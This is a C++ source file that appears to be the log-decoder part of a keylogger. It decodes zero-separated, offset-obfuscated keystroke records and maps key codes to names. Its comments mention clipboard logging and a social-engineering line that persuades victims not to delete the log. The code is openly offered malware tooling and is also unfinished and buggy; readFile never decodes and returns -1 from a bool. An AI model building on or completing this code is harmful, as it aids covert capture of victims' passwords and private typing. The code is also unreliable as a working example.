#include <Windows.h>
#include <iostream>
#include <string>
#include <thread>
#include <filesystem>
#include <fstream>
#include <vector>

/*
* By decoder logic, encoder should:
*	At the start of the line, generate a random digit 1-9 to determine offset of number-characters.
*	Add a '0' character before each number.
*	NOT add a '0' character after each number (don't do this).
*	
* TODO:
*	Figure out how to (or even if to) handle CTRL (probably not, we have clipboard-logging).
*/

std::vector<std::string> findStringsBetweenZeroes(std::string& line)
{
	std::vector<std::string> retVec{};
	
	while (line.length() > 0)
	{
		if (line[0] == '0')
		{
			if (line.length() == 1) //catch nasty hanging 0
			{
				retVec[retVec.size() - 1] += '0';
				line.clear();
				break; //holy shit how did i forget to do this.
			}
			else
			{
				line.erase(0, 1);
			}
		}

		/*auto first_zero = line.find_first_of('0');
		std::cout << "First zero: " << first_zero << '\n';*/

		auto first_other_zero = line.find_first_of('0');

		int iterator = 1;


		while (line[first_other_zero + iterator] == '0')
		{
			++iterator;
		}

		//now, nextNumStart holds the start to the next number, disregarding the previous 0.
		size_t nextNumStart = first_other_zero + iterator;
		

		auto toCut = nextNumStart - 1;
		retVec.push_back(line.substr(0, toCut));
		line.erase(0, toCut); //erase afterwards, get ready for the next one!
	}
	
	return retVec;
}

std::vector<std::string> convToCharWOffset(std::vector<std::string>& vec, int& offset) //use string for shit like backspace
{
	std::vector<std::string> ret{};
	for (std::string str : vec)
	{
		int ch = std::stoi(str) - offset;
		switch (ch)
		{
		case 8:
			ret.push_back("BACKSPACE");
			break;
		case 9:
			ret.push_back("TAB");
			break;
		case 13:
			ret.push_back("ENTER");
			break;
		case 27:
			ret.push_back("ESC");
			break;
		case 32:
			ret.push_back("SPACE");
			break;
		default:
			ret.push_back(std::string(1, (char)ch));
			break;
		}
	}
	return ret;
}

//"0 20 0 30 0"

//0 5 0 65 0 19 0 30 0 5

bool readFile(std::string filename)
{
	std::string line;
	std::ifstream textFile(filename);
	if (textFile.is_open())
	{
		while (std::getline(textFile, line))
		{
			//used for some socialenginnering (#DONT DELETE THIS FILE) at the top or smth
			if (line.find_first_of('#') == std::string::npos)
				continue;

			//operate on the line:
			if (line[0] == 0)
			{
				std::cout << "Massive errror, no offset found!";
				return -1;
			}

			int offset = line[0]; //offset for every single int-basd char.
			line.erase(0, 1); //erase it, we don't need it :)

		}
		textFile.close();
	}
	else
		return false;
}

int main()
{
	
	std::string testStr = "60010400109001160011600115";
	for (std::string str : findStringsBetweenZeroes(testStr))
	{
		std::cout << "STR: [" << str << "]\n";
	}
}